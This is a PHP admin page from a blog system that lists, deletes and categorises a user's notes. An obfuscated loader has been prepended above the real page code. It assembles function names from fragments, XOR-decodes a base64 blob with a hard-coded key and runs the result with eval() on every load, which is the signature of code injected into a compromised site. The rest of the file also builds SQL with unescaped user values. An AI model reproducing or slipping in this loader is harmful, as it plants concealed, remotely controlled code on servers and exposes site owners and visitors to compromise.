<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>
<?php
if(!isset($AuthUserName)||trim($AuthUserName)=="")
{
	die("");
}
?>

<?php

if(isset($Delete))
{
	
	if(isset($CheckList)&&sizeof($CheckList)>0)
	{
		ms_ia($CheckList);
		SQLDeletePlus("notes","id",$CheckList);
	
	}

}

?>

<table summary="" border="0" width=100%>
	<tr>
		<td width=40><img src="images/icons/archive.png" width="48" height="48" alt="" border="0"></td>
		<td class="blog_admin_header">
		
		<?php echo $LIST_NOTES;?>
		
		</td>
	</tr>
</table>

<?php

$arrTDSizes=array("50","50","50","100","50","150","*");

$tableNotes = DataTable("notes","WHERE active='NO'");
$strHighlightIdName="id";
$arrHighlightIds=array();

while($arrNote = mysql_fetch_array($tableNotes))
{
	array_push($arrHighlightIds,$arrNote["id"]);
}

$arrNoteCategories=array();

$notesCatTable = DataTable("note_categories","WHERE user='$AuthUserName'");

while($noteCat = mysql_fetch_array($notesCatTable))
{
	$arrNoteCategories[$noteCat["id"]]=$noteCat["name"];
}
mysql_free_result($notesCatTable);

RenderTable_BA
(
	"notes",
	array("PreviewNote2","EditNote","ShowComments","date","title"),
	array($APPERCU,$MODIFY,$COMMENTS,$DATE_MESSAGE,$M_TITLE),
	"100%",
	"WHERE user='".$AuthUserName."'  ORDER BY id DESC",
	$EFFACER,
	"id",
	"index.php?action=".$action."&category=".$category
);
?>
<script>
var HTType="2";
var HTMessage="<?php echo $T_NOTES;?>";
document.onmousedown = HTMouseDown;
</script>

